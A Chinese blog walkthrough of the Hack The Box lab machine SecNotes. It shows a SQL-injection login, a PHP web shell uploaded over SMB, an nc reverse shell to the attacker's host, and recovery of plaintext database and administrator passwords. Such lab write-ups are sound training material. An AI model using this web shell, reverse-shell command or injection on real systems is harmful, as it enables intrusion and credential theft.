---
title: HackTehBox-SecNotes
tags:
  - 靶机渗透
categories:
  - 技术水文
copyright: true
abbrlink: 8e5dfaea
date: 2019-02-02 16:46:15
---

![](https://ae01.alicdn.com/kf/HTB1dvGeaBaE3KVjSZLe760sSFXaw.png)
<!--more-->

## 信息收集 ##

```bash
nmap -p- -sV 10.10.10.97
```

开放了80、445、8808三个端口

![](https://ae01.alicdn.com/kf/HTB1h2ejaBCw3KVjSZFl763JkFXaE.png)
访问80端口，是个登录页面，注册一个账号

```bash
user:' w'or 1='1
pass:' w'or 1='1
```

![s](https://ae01.alicdn.com/kf/HTB1gWyfaCWD3KVjSZSg763CxVXaP.png)

注册成功，使用【w'or 1='1】登录，发现第三个笔记疑似smb之类的账号密码

![](https://ae01.alicdn.com/kf/HTB1w95larus3KVjSZKb760qkFXat.png)

使用 smbclient 尝试登录smb,用户：`Tyler`，密码：`92g!mA8BGjOirkL%OG*&`

```bash
smbclient //10.10.10.97/new-site -U Tyler
```

登录后发现该目录是web服务8808端口的根目录

![](https://ae01.alicdn.com/kf/HTB1p4yjaBCw3KVjSZFu763AOpXa6.png)

## 利用 ##

上传一句话马

```bash
put x.php   #注意，要把php放到当前运行目录下才能上传，不然不报错
```

```php
<?php
 if(isset($_REQUEST['x'])){
  $cmd = ($_REQUEST['x']);
  system($cmd);
  die;
 }
?>
```

![](https://ae01.alicdn.com/kf/HTB1ycSdaEWF3KVjSZPh760clXXaF.png)

这里要注意的是，目标机好像不是很稳定，不是php马被删就是smb断开连接，所以下面上传个nc通过之前上传的php马执行反弹一个shell回来

```
http://10.10.10.97:8808/atom.php?cmd=nc%2010.10.14.24%201337%20-e%20cmd.exe
```

![](https://ae01.alicdn.com/kf/HTB1aDacawKG3KVjSZFL761MvXXaI.png)

在`wwwroot`目录下找到连接数据库文件`db.php`

```php
<?php

if ($includes != 1) {
	die("ERROR: Should not access directly.");
}

/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'secnotes');
define('DB_PASSWORD', 'q8N#9Eos%JinE57tke72');
//define('DB_USERNAME', 'root');
//define('DB_PASSWORD', 'qwer1234QWER!@#$');
define('DB_NAME', 'secnotes');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
     
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

数据库连接文件暂时不管它了，先找`user.txt`

![](https://ae01.alicdn.com/kf/HTB1KeCdaECF3KVjSZJn762nHFXaf.png)

在桌面找到user.txt，还发现了个可疑的`bash.lnk`,运行该bash报错不存在，那就查找下真正路径在哪吧，找到完整路径后重新执行运行bash

```bash
where /R c:\ bash.exe

c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```

![secnotes8.png](https://ae01.alicdn.com/kf/HTB1lAijaBGw3KVjSZFD760WEpXaF.png)

为了方便，使用python反弹个交互式的shell会话

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

查看历史命令，发现曾经使用明文密码登录过smb

```bash
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
```

![](https://ae01.alicdn.com/kf/HTB1e9ueaBWD3KVjSZFs763qkpXaH.png)

登录smb，在桌面找到root.txt

![](https://ae01.alicdn.com/kf/HTB1GlGdaA9E3KVjSZFG76319XXau.png)
